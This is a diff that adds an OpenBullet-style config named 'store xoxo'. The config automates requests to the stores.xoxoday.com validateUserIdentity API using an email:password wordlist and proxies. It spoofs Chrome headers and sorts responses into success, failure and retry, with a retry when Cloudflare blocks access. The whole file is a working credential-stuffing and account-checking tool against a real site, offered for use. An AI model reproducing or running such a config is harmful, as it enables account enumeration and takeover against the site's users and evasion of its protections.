@@ -1,0 +1,76 @@
+[SETTINGS]
+{
+  "Name": "store xoxo",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2021-07-06T11:42:23.1290184+05:30",
+  "AdditionalInfo": "",
+  "Version": "1.4.1 [Anomaly]",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://stores.xoxoday.com/chef/api/public/validateUserIdentity" 
+  CONTENT "{\"variables\":{\"user_input\":\"<USER>\"}}" 
+  CONTENTTYPE "application/json" 
+  HEADER "authority: stores.xoxoday.com" 
+  HEADER "accept: application/json, text/plain, */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "content-type: application/json" 
+  HEADER "lng: en" 
+  HEADER "origin: https://stores.xoxoday.com" 
+  HEADER "pltfm: 4" 
+  HEADER "referer: https://stores.xoxoday.com/marketplace/" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"90\", \"Google Chrome\";v=\"90\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "The email address and/or password are incorrect" 
+    KEY "{\"success\":0" 
+  KEYCHAIN Success OR 
+    KEY "{\"success\":1" 
+  KEYCHAIN Retry OR 
+    KEY "Access denied | stores.xoxoday.com used Cloudflare to restrict access</title"
